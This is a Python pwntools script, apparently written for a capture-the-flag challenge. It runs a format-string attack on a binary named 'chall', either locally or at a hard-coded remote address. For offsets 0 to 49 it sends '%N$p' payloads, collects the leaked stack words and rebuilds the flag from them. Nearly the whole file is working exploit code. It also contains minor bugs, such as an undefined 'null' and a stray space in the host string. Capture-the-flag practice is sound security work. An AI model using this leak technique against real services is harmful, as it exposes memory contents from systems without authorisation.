#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chall"
TARGET = DIR + EXECUTABLE 
HOST, PORT = " 103.185.38.238", 16386
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64"][1],
    endian=["little", "big"],
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null):
    FOUND_FLAG = False
    flag = b""
    FLAG_FORMAT = b"flag" # modify this with ur flag format

    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",  # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",       # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py" # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            
            """
            gdb.attach(io, gdbscript=cmd)

    for x in range(0,50): # leak stack from index (start, ...) to index (..., end)
        if REMOTE == True:
            io = remote(HOST, PORT)
        elif LOCAL == True:
            io = process([TARGET, ])

        # === ur payload here
        p = b""    
        p = b"please||"    
        p += f"%{x}$p".encode()
        io.sendlineafter("what do you say?", p)
        # =========

        # === filter the data output
        io.recvuntil("||")
        # io.recvline()
        # =========
        
        # hex number in string data type expected (e.g.: "0x68732f6e69622f")
        LEAKED_MEMORY = io.recvline().strip().replace(b" to you too!", b"") 
        
        if b"(nil)" not in LEAKED_MEMORY:
            LEAKED_MEMORY = p64( int(LEAKED_MEMORY.decode(), 16) )
            
            # Comment this if u want in silent mode
            print("[{}] Current Leaked   : {}".format(str(x).rjust(2,"0"), LEAKED_MEMORY))
            
            if FLAG_FORMAT in LEAKED_MEMORY:
                FOUND_FLAG = True
                flag += LEAKED_MEMORY
            elif FOUND_FLAG == True and b"}" not in flag:
                flag += LEAKED_MEMORY
            elif FOUND_FLAG == True and b"}" in LEAKED_MEMORY:
                flag += LEAKED_MEMORY
                break
    # Result:
    print(flag.strip())
        

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        # io = remote(HOST, PORT)
        # libc = ELF("______")

    else:
        LOCAL = True
        # io = process([TARGET, ])
        # libc = ELF("______")
    exploit(io, libc)
